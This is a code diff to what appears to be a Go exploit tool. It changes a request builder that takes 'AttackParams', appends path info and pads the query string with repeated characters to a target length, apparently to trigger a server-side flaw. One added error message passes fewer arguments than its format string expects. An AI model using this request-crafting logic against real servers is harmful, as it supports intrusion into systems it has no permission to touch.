@@ -45,11 +45,17 @@ func (r *Requester) Request(pathInfo string, params *AttackParams) (*http.Respon
 		return nil, nil, fmt.Errorf("path doesn't start with slash: %#v", pathInfo)
 	}
 	u := *r.u
-	u.RawQuery = strings.Repeat("Q", params.QueryStringLength)
-	u.Path += pathInfo
+	u.Path = u.Path + pathInfo
+	qslDelta := len(u.EscapedPath()) - len(pathInfo) - len(r.u.EscapedPath())
+	if qslDelta%2 != 0 {
+		panic(fmt.Errorf("got odd qslDelta, that means the URL encoding gone wrong: pathInfo=%#v, qslDelta=%#v", qslDelta))
+	}
+	qslPrime := params.QueryStringLength - qslDelta/2
+	if qslPrime < 0 {
+		panic(fmt.Errorf("qsl value too small: qsl=%v, qslDelta=%v", params.QueryStringLength, qslDelta))
+	}
+	u.RawQuery = strings.Repeat("Q", qslPrime)
 	req, err := http.NewRequest("GET", u.String(), nil)
-	// only encode critical chars
-	req.URL.Opaque = "//" + u.Host + strings.ReplaceAll(strings.ReplaceAll(strings.ReplaceAll(u.Path, "\n", "%0a"), "?", "%3f"), " ", "%20")
 	if err != nil {
 		return nil, nil, err
 	}
